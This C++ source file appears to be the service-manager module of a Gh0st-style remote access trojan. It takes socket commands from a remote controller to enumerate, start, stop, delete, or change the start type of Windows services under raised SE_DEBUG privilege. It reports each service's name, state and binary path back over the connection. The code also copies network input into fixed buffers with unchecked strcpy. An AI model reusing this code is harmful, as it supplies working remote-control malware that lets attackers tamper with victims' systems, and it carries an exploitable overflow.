#include "SerManager.h"
#include "until.h"
#include "SystemManager.h"
#include "winsvc.h"

//////////////////////////////////////////////////////////////////////
enum
{
	COMMAND_SSLIST = 1,				// 服务列表
	COMMAND_STARTSERVERICE,			// 启动服务
	COMMAND_STOPSERVERICE,			// 停止服务
	COMMAND_DELETESERVERICE,		// 删除服务
	COMMAND_CREATSERVERICE,			// 创建服务
	COMMAND_AUTOSERVERICE,			// 自启动
	COMMAND_HANDSERVERICE,			// 手动
	COMMAND_DISABLESERVERICE		// 禁止
};
BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		return FALSE;

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
	LookupPrivilegeValue(NULL, lpPrivilegeName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}
//////////////////////////////////////////////////////////////////////

CSerManager::CSerManager(CClientSocket* pClient) : CManager(pClient)
{
	SendServicesList();
}

CSerManager::~CSerManager()
{

}
void CSerManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_SSLIST:
		SendServicesList();
		break;
	case COMMAND_STARTSERVERICE:  //启动服务
		StartStopService((LPBYTE)lpBuffer + 1, nSize - 1, TRUE);
		break;
	case COMMAND_STOPSERVERICE:   //停止服务
		StartStopService((LPBYTE)lpBuffer + 1, nSize - 1, NULL);
		break;
	case COMMAND_DELETESERVERICE:  //删除服务
		DeleteService((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_AUTOSERVERICE:     //自动服务
		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 2);
		break;
	case COMMAND_HANDSERVERICE:     //手动服务
		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 1);
		break;
	case COMMAND_DISABLESERVERICE:  //禁用服务
		DisableService((LPBYTE)lpBuffer + 1, nSize - 1, 0);
		break;
	}
}

void CSerManager::SendServicesList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getServicesList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSerManager::DisableService(LPBYTE lpBuffer, UINT nSize, UCHAR strn)  // strn=0 禁用 strn=1自动 strn=2手动 
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	SC_HANDLE scm;
	SC_HANDLE service;
	//SERVICE_STATUS status;

	scm = OpenSCManager(NULL, NULL, SC_MANAGER_LOCK);

	char temp[500];
	char* ServerName = NULL;
	strcpy(temp, (char*)(lpBuffer));
	ServerName = temp;
	service = OpenService(scm, ServerName, SERVICE_CHANGE_CONFIG);  // 打开www服务
	//BOOL isSuccess=QueryServiceStatus(service,&status);

	SC_LOCK sclLock;
	DWORD  dwStartType;
	sclLock = LockServiceDatabase(scm);

	if (strn == 0)       //禁用服务
	{
		dwStartType = SERVICE_DISABLED;
	}
	else if (strn == 1)  //手动服务
	{
		dwStartType = SERVICE_DEMAND_START;
	}
	else if (strn == 2)  //自动服务
	{
		dwStartType = SERVICE_AUTO_START;
	}

	ChangeServiceConfig(
		service,        // handle of service 
		SERVICE_NO_CHANGE, // service type: no change 
		dwStartType,       // change service start type 
		SERVICE_NO_CHANGE, // error control: no change 
		NULL,              // binary path: no change 
		NULL,              // load order group: no change 
		NULL,              // tag ID: no change 
		NULL,              // dependencies: no change 
		NULL,              // account name: no change
		NULL,				// password: no change
		NULL);				//displayname 

	if (sclLock != NULL)
		UnlockServiceDatabase(sclLock);
	CloseServiceHandle(service);
	CloseServiceHandle(scm);

	// 稍稍Sleep下，防止出错
	Sleep(200);
	SendServicesList();
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
}

void CSerManager::DeleteService(LPBYTE lpBuffer, UINT nSize)   //删除服务
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	SC_HANDLE schManager;
	SC_HANDLE schService;
	SERVICE_STATUS status;

	schManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

	char temp[500];
	char* ServerName = NULL;
	strcpy(temp, (char*)(lpBuffer));
	ServerName = temp;
	DWORD _err = 0;
	schService = OpenService(schManager, ServerName, SERVICE_QUERY_STATUS | SERVICE_STOP | DELETE);

	_err = GetLastError();
	BOOL isSuccess = QueryServiceStatus(schService, &status);

	if (status.dwCurrentState != SERVICE_STOPPED)
	{
		isSuccess = ControlService(schService, SERVICE_CONTROL_STOP, &status);
	}
	isSuccess = ::DeleteService(schService);
	CloseServiceHandle(schService);
	CloseServiceHandle(schManager);

	// 稍稍Sleep下，防止出错
	Sleep(200);
	SendServicesList();
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
}

void CSerManager::StartStopService(LPBYTE lpBuffer, UINT nSize, BOOL strp)  //启动 停止服务
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;

	scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);  // 打开服务管理对象

	char temp[500];
	char* ServerName = NULL;
	strcpy(temp, (char*)(lpBuffer));
	ServerName = temp;

	service = OpenService(scm, ServerName, SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP);  // 打开www服务

	BOOL isSuccess = QueryServiceStatus(service, &status);

	if (strp == TRUE)  //启动服务
	{
		if (status.dwCurrentState == SERVICE_STOPPED)  //服务停止状态 就启动服务
		{
			isSuccess = StartService(service, NULL, NULL);
		}
	}
	else    //停止服务
	{
		if (status.dwCurrentState != SERVICE_STOPPED)
		{
			isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		}
	}

	CloseServiceHandle(service);
	CloseServiceHandle(scm);

	// 稍稍Sleep下，防止出错
	Sleep(200);
	SendServicesList();
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
}

LPBYTE CSerManager::getServicesList()
{
	EnablePrivilege(SE_DEBUG_NAME, TRUE);
	LPBYTE lpBuffer = NULL; DWORD dwOffset = 0;
	SC_HANDLE schManager = NULL, schService = NULL;
	DWORD dwBufSize = 0, dwCount, dwResumeHandle = 0;
	LPENUM_SERVICE_STATUS lpServices = NULL;
	LPQUERY_SERVICE_CONFIG lpServiceConfig = NULL;
	LPSERVICE_DESCRIPTION  lpServiceDescription = NULL;
	char szServiceStartType[256], szServiceState[256];
	DWORD dwLength = 0;

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);
	lpBuffer[0] = TOKEN_SSLIST;
	dwOffset = 1;

	schManager = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	EnumServicesStatus(schManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, dwBufSize, &dwBufSize, &dwCount, &dwResumeHandle);
	lpServices = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, dwBufSize);
	EnumServicesStatus(schManager, SERVICE_WIN32, SERVICE_STATE_ALL, lpServices, dwBufSize, &dwBufSize, &dwCount, &dwResumeHandle);

	for (DWORD i = 0; i < dwCount; i++)
	{
		schService = OpenService(schManager, lpServices[i].lpServiceName, SERVICE_QUERY_CONFIG);
		if (schService == NULL)
		{
			continue;
		}

		dwBufSize = 0;
		QueryServiceConfig(schService, NULL, dwBufSize, &dwBufSize);
		lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, dwBufSize);
		QueryServiceConfig(schService, lpServiceConfig, dwBufSize, &dwBufSize);
		dwBufSize = 0;
		QueryServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, NULL, dwBufSize, &dwBufSize);
		lpServiceDescription = (LPSERVICE_DESCRIPTION)LocalAlloc(LPTR, dwBufSize);
		QueryServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, (LPBYTE)lpServiceDescription, dwBufSize, &dwBufSize);

		if (lpServiceConfig->dwStartType == 2)
		{
			ZeroMemory(szServiceStartType, sizeof(szServiceStartType));
			lstrcat(szServiceStartType, "自动");
		}
		else if (lpServiceConfig->dwStartType == 3)
		{
			ZeroMemory(szServiceStartType, sizeof(szServiceStartType));
			lstrcat(szServiceStartType, "手动");
		}
		else if (lpServiceConfig->dwStartType == 4)
		{
			ZeroMemory(szServiceStartType, sizeof(szServiceStartType));
			lstrcat(szServiceStartType, "禁用");
		}

		if (lpServices[i].ServiceStatus.dwCurrentState != SERVICE_STOPPED)
		{
			ZeroMemory(szServiceState, sizeof(szServiceState));
			lstrcat(szServiceState, "启动");
		}
		else
		{
			ZeroMemory(szServiceState, sizeof(szServiceState));
			//lstrcat(szServiceState, "停止");
		}

		dwLength = lstrlen(lpServices[i].lpDisplayName) + 1 +
			lstrlen(lpServiceDescription->lpDescription) + 1 +
			lstrlen(lpServices[i].lpServiceName) + 1 +
			lstrlen(szServiceStartType) + 1 +
			lstrlen(szServiceState) + 1 +
			lstrlen(lpServiceConfig->lpBinaryPathName) + 1;
		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
		{
			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);
		}

		if (lstrlen(lpServices[i].lpDisplayName) > 0)
		{
			memcpy(lpBuffer + dwOffset, lpServices[i].lpDisplayName, lstrlen(lpServices[i].lpDisplayName) + 1);
		}
		dwOffset += lstrlen(lpServices[i].lpDisplayName) + 1;

		if (lstrlen(lpServiceDescription->lpDescription) > 0)
		{
			memcpy(lpBuffer + dwOffset, lpServiceDescription->lpDescription, lstrlen(lpServiceDescription->lpDescription) + 1);
		}
		dwOffset += lstrlen(lpServiceDescription->lpDescription) + 1;

		if (lstrlen(lpServices[i].lpServiceName) > 0)
		{
			memcpy(lpBuffer + dwOffset, lpServices[i].lpServiceName, lstrlen(lpServices[i].lpServiceName) + 1);
		}
		dwOffset += lstrlen(lpServices[i].lpServiceName) + 1;

		memcpy(lpBuffer + dwOffset, szServiceStartType, lstrlen(szServiceStartType) + 1);
		dwOffset += lstrlen(szServiceStartType) + 1;

		memcpy(lpBuffer + dwOffset, szServiceState, lstrlen(szServiceState) + 1);
		dwOffset += lstrlen(szServiceState) + 1;

		if (lstrlen(lpServiceConfig->lpBinaryPathName) > 0)
		{
			memcpy(lpBuffer + dwOffset, lpServiceConfig->lpBinaryPathName, lstrlen(lpServiceConfig->lpBinaryPathName) + 1);
		}
		dwOffset += lstrlen(lpServiceConfig->lpBinaryPathName) + 1;

		LocalFree(lpServiceDescription);
		LocalFree(lpServiceConfig);
		CloseServiceHandle(schService);
	}

	LocalFree(lpServices);
	CloseServiceHandle(schManager);
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);
	EnablePrivilege(SE_DEBUG_NAME, FALSE);
	return lpBuffer;
}
